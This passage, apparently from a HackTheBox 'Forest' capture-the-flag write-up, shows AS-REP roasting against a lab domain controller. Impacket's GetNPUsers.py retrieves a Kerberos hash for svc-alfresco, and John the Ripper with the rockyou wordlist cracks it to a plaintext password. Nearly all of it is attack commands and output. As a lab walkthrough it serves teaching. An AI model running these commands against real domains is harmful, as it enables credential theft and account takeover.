With the script GetNPUsers.py from Impacket we can get TGTs for the users that have the property 'Do not require Kerberos preauthentication' set

```bash
┌──(kali㉿kali)-[~]
└─$ /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/'
Impacket v0.11.0 - Copyright 2023 Fortra

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2023-11-13 10:55:56.785098  2019-09-23 13:09:47.931194  0x410200 



$krb5asrep$23$svc-alfresco@HTB.LOCAL:e355c0792430b022fbdacb5654da2988$4380c6c0b5332be61bc0cc0195eb4f11821ac30cf0e90c867d1d979afb48a9ad0a6f518814ed5804557bc6e47a79acbd2a8633dd1f142625f9e61407c34fcec0fde96d9145c4e577064d801fe02bbdf451689ee2ff22ff0a30f558f20263d5b1ce278b7c5a1586ee6174657844c317f4286d44a14dba66aba119a46bf67ec4ef8c7e73f5df9b928cb35bb882d4db50e4f7a8d259044b61e834aeb1a3850a56f0e89414564c23854a7b949667f0212e7266f0f45d4d1c452c2b26cc7454a8792b9e69f139a41dd7e42832593c358f864060386625a0e939fb0f615cd72ffda088b7712e6c7907

┌──(kali㉿kali)-[~/Documents/Boxes/Forest-10.10.10.161]
└─$ john alfresco.hash -w=/usr/share/wordlists/rockyou.txt         
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          (alfresco@HTB.LOCAL)     
1g 0:00:00:08 DONE (2023-11-13 10:53) 0.1179g/s 481811p/s 481811c/s 481811C/s s401447401447401447..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

And we got the credentials svc-alfresco:s3rvice